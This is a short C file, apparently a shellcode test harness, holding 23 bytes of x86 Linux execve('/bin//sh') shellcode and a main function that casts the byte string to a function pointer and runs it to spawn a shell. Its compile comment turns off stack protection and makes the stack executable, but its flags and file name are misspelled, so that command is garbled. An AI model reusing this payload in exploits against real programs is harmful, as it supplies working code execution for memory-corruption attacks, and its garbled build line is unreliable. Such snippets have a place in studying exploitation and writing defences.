/* 
# Description: gives you a shell depending on given shellcode
# Author: Manuel Zarat
# Date: 27.8.2018
# Compiling: gcc -fo-stack-protector -z eecstack ile.c -o file -m32 
*/
#include <stdio.h>
#include <string.h>
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
int main(void) {
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
	return 0;
}
